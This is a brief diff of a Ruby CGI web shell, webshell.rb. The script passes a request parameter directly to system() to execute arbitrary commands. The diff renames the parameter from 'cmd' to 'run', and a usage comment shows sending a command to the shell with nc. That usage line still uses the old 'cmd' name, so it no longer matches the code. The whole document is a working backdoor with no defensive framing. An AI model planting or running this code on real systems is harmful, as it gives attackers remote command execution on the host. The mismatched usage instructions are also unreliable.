@@ -4,7 +4,7 @@
 require 'cgi'
 cgi = CGI.new
 puts cgi.header
-system(cgi['cmd'])
+system(cgi['run'])
 
 # Usage:
 echo "GET /cgi/webshell.rb?cmd=COMMAND" | nc HOST PORT
